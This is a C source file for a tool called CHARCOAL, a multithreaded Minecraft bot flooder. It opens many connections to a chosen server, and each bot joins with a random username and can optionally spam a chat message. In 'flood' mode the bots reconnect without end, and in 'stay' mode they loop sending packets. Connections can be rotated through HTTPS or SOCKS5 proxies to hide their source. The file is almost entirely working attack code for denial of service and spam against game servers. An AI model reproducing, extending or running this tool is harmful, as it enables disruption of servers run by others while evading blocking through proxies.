#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <strings.h>

#ifdef _WIN32
    #include <ws2tcpip.h>
    #include <winsock2.h>
    #include <winsock.h>

    #ifdef _MSC_VER
        #pragma comment(lib, "ws2_32.lib")
    #endif

    #define socket_type SOCKET
    #define MSG_NOSIGNAL 0
    #define socket_close closesocket
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <resolv.h>
    #include <arpa/nameser.h>

    #define socket_type int
    #define socket_close close
#endif

#include "protocol.c"
#include "utils.c"
#include "proxy.c"

#define MODE_STAY 0
#define MODE_FLOOD 1

#define HTTPS 0
#define SOCKS5 1

int protocol;
int bot_mode = MODE_FLOOD;
int proxy_mode = HTTPS;

int srv_resolved = 0;

void bot_connect(const char *address, const struct ip_address resolved, const char *username, const int thread, const char *message, const struct ip_address proxy) {
    struct sockaddr_in server;
    socket_type sock;

    if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to initialize socket\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
        return;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(proxy.port == 0 ? resolved.port : proxy.port);

    if(!inet_pton(AF_INET, proxy.port == 0 ? resolved.address : proxy.address, &server.sin_addr)) {
        socket_close(sock);
        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to resolve IP address\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
        exit(1);
    }

    if((connect(sock, (struct sockaddr*)&server, sizeof(server))) < 0) {
        socket_close(sock);
        fprintf(stderr, "[%sERROR%s][%sTHREAD%03d%s] Unable to connect to server\n", COLOR_RED, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
        if(proxy.port == 0) {
            exit(1);
        }else {
            return;
        }
    }

    char proxy_str[256];
    zerofill(proxy_str, 256);
    if(proxy.port > 0) {
        sprintf(proxy_str, " with proxy %s:%d", proxy.address, proxy.port);
    }
    printf("[%sINFO%s][%sTHREAD%03d%s] Bot '%s' connecting%s\n", COLOR_GREEN, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET, username, proxy_str);

    if(proxy.port > 0) {
        struct ip_address proxy_unresolved;
        strcpy(proxy_unresolved.address, srv_resolved ? resolved.address : address);
        proxy_unresolved.port = resolved.port;
        if(proxy_mode == HTTPS) {
            char https[256];
            build_https_proxy_connect(https, proxy_unresolved);
            send(sock, https, strlen(https), MSG_NOSIGNAL);
        }else if(proxy_mode == SOCKS5) {
            char *socks5_connect_request;
            int socks5_size = 0;
            send(sock, socks5_handshake, 3, MSG_NOSIGNAL);
            build_socks5_proxy_connect(proxy_unresolved, &socks5_connect_request, &socks5_size);
            send(sock, socks5_connect_request, socks5_size, MSG_NOSIGNAL);
            free(socks5_connect_request);
            sleep(1);
        }
    }

    struct packet packet;

    ping_packet(address, resolved.port, 2, &packet);
    send_packet(sock, packet);

    join_packet(username, &packet);
    send_packet(sock, packet);
    
    sleep(1);

    if(strlen(message) > 0) {
        chat_message_packet(message, &packet);
        send_packet(sock, packet);
    }

    player_packet(1, &packet);

    if(bot_mode == MODE_STAY) {
        while(1) {
            if(send_packet(sock, packet) == -1) {
                printf("[%sINFO%s][%sTHREAD%03d%s] Connection closed\n", COLOR_GREEN, COLOR_RESET, COLOR_BLUE, thread, COLOR_RESET);
                break;
            }
        }
    }
    
    socket_close(sock);
}

struct args {
    char *address;
    struct ip_address resolved;
    int thread;
    char **proxies;
    int proxy_amount;
    char *message;
};

void *bot_loop(void *args) {
    struct args * _args = ((struct args *)args);
    init_random((getpid() << 16) ^ _args->thread);

    struct ip_address proxy;
    proxy.port = 0;
    while(1) {
        if((_args->proxy_amount) > 0) {
            char *selected_proxy = (_args->proxies)[rand() % (_args->proxy_amount)];
            parse_proxy(selected_proxy, &proxy);
            if(proxy.port == 0 || !ipaddress_valid(proxy.address)) {
                continue;
            }
        }
        char *username = random_string(10);
        bot_connect(
            _args->address,
            _args->resolved,
            username,
            _args->thread,
            _args->message,
            proxy
        );
        free(username);
    }
    return 0;
}

void print_help(char *executable) {
    printf("usage: %s -i address [-p port] [-t thread number] [-m mode] [-c message] [-v protocol version] [-x proxy file] [-k proxy type]\n", executable);
    exit(1);
}

int main(int argc, char *argv[]) {
    #ifdef _WIN32
        WSADATA wsa;
        if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            fprintf(stderr, "[%sERROR%s] Unable to initialize WinSock\n", COLOR_RED, COLOR_RESET);
        }
        win_enable_colors();
    #endif

    printf(">>>>> %sCHARCOAL%s for Minecraft (github.com/gcrbr)\n\n", COLOR_CHARCOAL, COLOR_RESET);

    protocol = 47;

    int thread_number = 10;
    char address[256];
    int port = 25565;
    char proxy_file[256];
    char message[256];

    int proxy_file_set = 0;
    int message_set = 0;

    int opt;
    while((opt = getopt(argc, argv, "i:p:t:x:m:v:c:hk:")) > 0) {
        switch(opt) {
            case 'i':
                strcpy(address, optarg);
                break;
            case 'p':
                if(!(port = atoi(optarg))) {
                    fprintf(stderr, "[%sERROR%s] Invalid port number\n", COLOR_RED, COLOR_RESET);
                    exit(1);
                }
                break;
            case 't':
                if(!(thread_number = atoi(optarg))) {
                    fprintf(stderr, "[%sERROR%s] Invalid number of threads\n", COLOR_RED, COLOR_RESET);
                    exit(1);
                }
                break;
            case 'x':
                strcpy(proxy_file, optarg);
                proxy_file_set = 1;
                break;
            case 'c':
                strcpy(message, optarg);
                message_set = 1;
                break;
            case 'v':
                if((!(protocol = atoi(optarg)) || protocol == 1) && !(protocol = get_protocol_by_version(optarg))) {
                    fprintf(stderr, "[%sERROR%s] Invalid protocol number '%s'\n", COLOR_RED, COLOR_RESET, optarg);
                    exit(1);
                }
                break;
            case 'm':
                strtolower(optarg);
                if(!strcmp(optarg, "stay")) {
                    bot_mode = MODE_STAY;
                }else if(!strcmp(optarg, "flood")) {
                    bot_mode = MODE_FLOOD;
                }else {
                    fprintf(stderr, "[%sERROR%s] Invalid mode '%s', available modes: STAY, FLOOD\n", COLOR_RED, COLOR_RESET, optarg);
                    exit(1);
                }
                break;
            case 'k':
                strtolower(optarg);
                if(!strcmp(optarg, "https")) {
                    proxy_mode = HTTPS;
                }else if(!strcmp(optarg, "socks") || strcmp(optarg, "socks5")) {
                    proxy_mode = SOCKS5;
                }else {
                    fprintf(stderr, "[%sERROR%s] Invalid proxy type '%s', available types: HTTPS, SOCKS5\n", COLOR_RED, COLOR_RESET, optarg);
                    exit(1);
                }
                break;
            case 'h':
                print_help(argv[0]);
                break;
            default:
                print_help(argv[0]);
                break;
        }
    }

    if(strlen(address) == 0) {
        print_help(argv[0]);
    }

    char **proxies;
    int proxy_amount = -1;
    if(proxy_file_set) {
        read_proxy_file(proxy_file, &proxies, &proxy_amount);
    }

    struct ip_address connection_address;
    strcpy(connection_address.address, address);
    connection_address.port = port;
    if(!ipaddress_valid(address)) {
        char ip[16];
        if(resolve_hostname(address, ip)) {
            strcpy(connection_address.address, ip);
        }else {
            if(!resolve_srv(address, connection_address.address, &connection_address.port)) {
                fprintf(stderr, "[%sERROR%s] Invalid IP address or hostname\n", COLOR_RED, COLOR_RESET);
                exit(1);
            }else {
                srv_resolved = 1;
            }
        }
    }

    pthread_t threads[thread_number];
    
    for(int i = 0; i < thread_number; ++i) {
        struct args *func_args = (struct args *)malloc(sizeof(struct args));
        func_args->address = address;
        func_args->resolved = connection_address;
        func_args->thread = i + 1;
        func_args->proxies = proxies;
        func_args->proxy_amount = proxy_amount;
        func_args->message = message_set ? message : "";
        pthread_create(&threads[i], NULL, bot_loop, (void *)func_args);
    }

    for(int i=0; i < thread_number; ++i) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}